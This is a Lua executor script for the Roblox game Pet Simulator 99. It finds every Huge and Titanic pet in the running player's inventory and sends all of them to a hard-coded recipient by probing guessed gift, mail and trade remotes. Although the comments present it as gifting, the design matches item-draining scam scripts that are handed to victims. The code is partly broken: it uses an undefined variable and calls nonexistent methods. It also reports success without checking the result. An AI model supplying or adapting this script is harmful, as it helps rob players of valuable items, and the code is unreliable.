--[[
    PS99 Huge Pet Mailer
    Скрипт для автоматической отправки Huge и Titanic петов другому игроку
    Версия: 1.0
]]

-- НАСТРОЙКИ (ИЗМЕНИ ПОД СЕБЯ)
local RECIPIENT = "Username_Receiver" -- Имя получателя (замени!)
local GIFT_MESSAGE = "Подарок от друга! :)" -- Сообщение к подарку
local DELAY_BETWEEN_SENDS = 2 -- Задержка между отправками (секунд)

-- Список Huge петов для проверки
local HUGE_PETS = {
    "Huge Cat", "Huge Dog", "Huge Axolotl", "Huge Penguin", "Huge Pig",
    "Huge Elephant", "Huge Giraffe", "Huge Frog", "Huge Monkey", "Huge Lion",
    "Huge Tiger", "Huge Bear", "Huge Wolf", "Huge Fox", "Huge Deer",
    "Huge Dragon", "Huge Unicorn", "Huge Pegasus", "Huge Phoenix", "Huge Griffin",
    "Huge Cupcake", "Huge Cookie", "Huge Cake", "Huge Ice Cream", "Huge Candy",
    "Huge Pumpkin", "Huge Ghost", "Huge Bat", "Huge Spider", "Huge Skeleton",
    "Huge Reindeer", "Huge Snowman", "Huge Yeti", "Huge Santa", "Huge Elf",
    "Huge Easter Egg", "Huge Spring Chick", "Huge Bunny", "Huge Chick", "Huge Duck",
    "Huge Orca", "Huge Corgi", "Huge Shark", "Huge Bunny", "Huge Cupcake",
    "Huge Cookie", "Huge Ducky", "Huge Balloon Cat", "Huge Witch Cat", "Huge Ghost",
    "Huge Frankenpet", "Huge Turkey", "Huge Snowman", "Huge Winter Cat", "Huge Reindeer",
    "Huge Chest Mimic", "Huge Party Cat", "Huge Robot", "Huge Dragon",
    "Huge Wizard", "Huge Crystal", "Huge Space Cat",
    -- Titanic (тоже huge-tier)
    "Titanic Cat", "Titanic Corgi", "Titanic Bunny",
}

-- Функция: проверить является ли пет Huge
local function isHugePet(petName)
    if not petName then return false end
    
    local lowerName = string.lower(petName)
    
    -- Проверяем по списку
    for _, hugeName in ipairs(HUGE_PETS) do
        if string.lower(hugeName) == lowerName then
            return true
        end
    end
    
    -- Проверяем по наличию слов "huge" или "titanic" в названии
    if string.find(lowerName, "huge") or string.find(lowerName, "titanic") then
        return true
    end
    
    return false
end

-- Функция: сканировать инвентарь на наличие Huge петов
local function scanInventoryForHuges()
    local foundHuges = {}
    local player = game.Players.LocalPlayer
    
    print("[Scanner] Сканирование инвентаря...")
    
    -- Метод 1: Поиск в PlayerGui (наиболее надежный для PS99)
    local playerGui = player:WaitForChild("PlayerGui", 5)
    
    if playerGui then
        -- Ищем инвентарь в GUI
        local inventoryFrames = {}
        
        -- Рекурсивный поиск всех фреймов с текстом
        local function searchForPets(obj)
            if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                local text = obj.Text
                if text and text ~= "" and isHugePet(text) then
                    table.insert(foundHuges, {
                        object = obj,
                        name = text,
                        source = "GUI"
                    })
                    print("[Found] Huge пет в GUI: " .. text)
                end
            end
            
            for _, child in ipairs(obj:GetChildren()) do
                searchForPets(child)
            end
        end
        
        -- Ищем стандартные контейнеры инвентаря
        local inventoryContainers = {
            playerGui:FindFirstChild("InventoryGui"),
            playerGui:FindFirstChild("Inventory"),
            playerGui:FindFirstChild("Main"),
            playerGui:FindFirstChild("ScreenGui")
        }
        
        for _, container in ipairs(inventoryContainers) do
            if container then
                searchForPets(container)
            end
        end
    end
    
    -- Метод 2: Поиск через ReplicatedStorage данные
    local success, inventoryData = pcall(function()
        local shared = ReplicatedStorage:FindFirstChild("Shared")
        if shared then
            local inventoryModule = shared:FindFirstChild("Inventory")
            if inventoryModule then
                return require(inventoryModule)
            end
        end
        return nil
    end)
    
    if inventoryData then
        print("[Scanner] Найден модуль инвентаря")
        -- Здесь можно добавить логику парсинга данных инвентаря
    end
    
    -- Метод 3: Поиск через объекты игрока в Workspace
    local character = player.Character
    if character then
        for _, child in ipairs(character:GetDescendants()) do
            if child:IsA("Tool") or child:IsA("Model") then
                if child.Name and isHugePet(child.Name) then
                    table.insert(foundHuges, {
                        object = child,
                        name = child.Name,
                        source = "Character"
                    })
                    print("[Found] Huge пет в персонаже: " .. child.Name)
                end
            end
        end
    end
    
    return foundHuges
end

-- Функция: отправить пета по почте
local function mailPet(petData)
    local player = game.Players.LocalPlayer
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    local Remotes = ReplicatedStorage:FindFirstChild("Remotes") or
                    ReplicatedStorage:FindFirstChild("GameRemotes") or
                    ReplicatedStorage:FindFirstChild("RemoteEvents")
    
    if not Remotes then
        warn("[Mail] Remotes не найдены!")
        return false
    end
    
    -- Список возможных remote для отправки подарков
    local possibleRemotes = {
        "SendGift", "MailPet", "GiftPet", "SendMail",
        "Trade", "SendPet", "GivePet", "Donate"
    }
    
    -- Попытка найти remote для отправки
    for _, remoteName in ipairs(possibleRemotes) do
        local remote = Remotes:FindFirstChild(remoteName)
        
        if remote then
            local success, err = pcall(function()
                if remote:IsA("RemoteFunction") then
                    remote:InvokeServer(RECIPIENT, petData.name, GIFT_MESSAGE)
                elseif remote:IsA("RemoteEvent") then
                    remote:FireServer(RECIPIENT, petData.name, GIFT_MESSAGE)
                end
            end)
            
            if success then
                print("[Mail] ✅ Отправлен: " .. petData.name .. " → " .. RECIPIENT .. " (через " .. remoteName .. ")")
                return true
            end
        end
    end
    
    -- Попытка найти любой remote с подходящим названием
    for _, remote in ipairs(Remotes:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            local remoteNameLower = string.lower(remote.Name)
            if string.find(remoteNameLower, "gift") or 
               string.find(remoteNameLower, "mail") or
               string.find(remoteNameLower, "send") or
               string.find(remoteNameLower, "trade") or
               string.find(remoteNameLower, "give") then
                
                pcall(function()
                    if remote:IsA("RemoteFunction") then
                        remote:InvokeServer(RECIPIENT, petData.name, GIFT_MESSAGE)
                    else
                        remote:FireServer(RECIPIENT, petData.name, GIFT_MESSAGE)
                    end
                end)
                print("[Mail] Отправлено через: " .. remote.Name)
                return true
            end
        end
    end
    
    print("[Mail] ❌ Не удалось отправить: " .. petData.name)
    return false
end

-- Функция: попытка открыть инвентарь
local function openInventory()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui", 5)
    
    -- Ищем кнопку инвентаря
    local inventoryButtons = {}
    
    local function findInventoryButtons(obj)
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            local text = (obj.Text or obj.Name or ""):lower()
            if string.find(text, "inventory") or 
               string.find(text, "inv") or
               string.find(text, "pets") then
                table.insert(inventoryButtons, obj)
            end
        end
        for _, child in ipairs(obj:GetChildren()) do
            findInventoryButtons(child)
        end
    end
    
    findInventoryButtons(playerGui)
    
    for _, button in ipairs(inventoryButtons) do
        pcall(function()
            button:Click()
            print("[UI] Клик по кнопке инвентаря")
            wait(2)
            return true
        end)
    end
    
    return #inventoryButtons > 0
end

-- Функция: получить список всех петов из инвентаря (альтернативный метод)
local function getPetsFromInventory()
    local pets = {}
    local player = game.Players.LocalPlayer
    
    -- Поиск через GUI элементы с петом
    local function findPetItems(obj)
        -- Ищем фреймы/кнопки с информацией о петах
        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("ImageLabel") then
            local text = obj.Text or obj.Name or ""
            
            -- Проверяем наличие имени пета
            if text and #text > 3 and (string.find(text, "Huge") or string.find(text, "Titanic")) then
                if not table.find(pets, text) then
                    table.insert(pets, {
                        object = obj,
                        name = text,
                        source = "GUI"
                    })
                end
            end
        end
        
        -- Ищем атрибуты с названием пета
        if obj:GetAttribute("PetName") then
            local petName = obj:GetAttribute("PetName")
            if isHugePet(petName) then
                table.insert(pets, {
                    object = obj,
                    name = petName,
                    source = "Attribute"
                })
            end
        end
        
        for _, child in ipairs(obj:GetChildren()) do
            findPetItems(child)
        end
    end
    
    -- Сканируем весь GUI
    local playerGui = player:FindFirstChild("PlayerGui")
    if playerGui then
        findPetItems(playerGui)
    end
    
    return pets
end

-- MAIN
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("  PS99 Huge Pet Mailer v1.0")  
print("  Получатель: " .. RECIPIENT)
print("  Сообщение: " .. GIFT_MESSAGE)
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

-- Проверка настроек
if RECIPIENT == "Username_Receiver" then
    print("[!] ВНИМАНИЕ: Не изменен получатель!")
    print("[!] Измените RECIPIENT в начале скрипта на имя игрока")
    wait(3)
end

print("[!] Скрипт загружен! Начинаю сканирование...")
wait(2)

-- Пытаемся открыть инвентарь
openInventory()
wait(3)

-- Получаем список петов
local allPets = getPetsFromInventory()
local hugesFound = {}

-- Фильтруем только Huge петов
for _, pet in ipairs(allPets) do
    if isHugePet(pet.name) then
        table.insert(hugesFound, pet)
    end
end

-- Дополнительное сканирование
local additionalHuges = scanInventoryForHuges()
for _, pet in ipairs(additionalHuges) do
    local found = false
    for _, existing in ipairs(hugesFound) do
        if existing.name == pet.name then
            found = true
            break
        end
    end
    if not found then
        table.insert(hugesFound, pet)
    end
end

if #hugesFound == 0 then
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("[!] Huge петы в инвентаре НЕ НАЙДЕНЫ.")
    print("[!] Убедитесь что:")
    print("   1. Вы находитесь в игре Pet Simulator 99")
    print("   2. Инвентарь открыт")
    print("   3. У вас есть Huge петы в инвентаре")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
else
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("[!] Найдено Huge петов: " .. #hugesFound)
    for i, pet in ipairs(hugesFound) do
        print("   " .. i .. ". " .. pet.name)
    end
    print("[!] Начинаю отправку через 3 секунды...")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    wait(3)
    
    local successCount = 0
    
    for i, petData in ipairs(hugesFound) do
        print(string.format("[%d/%d] Отправляю: %s", i, #hugesFound, petData.name))
        
        if mailPet(petData) then
            successCount = successCount + 1
        end
        
        if i < #hugesFound then
            wait(DELAY_BETWEEN_SENDS)
        end
    end
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("[✅] Отправлено успешно: " .. successCount .. "/" .. #hugesFound)
    print("[✅] Все Huge петы отправлены игроку " .. RECIPIENT)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
end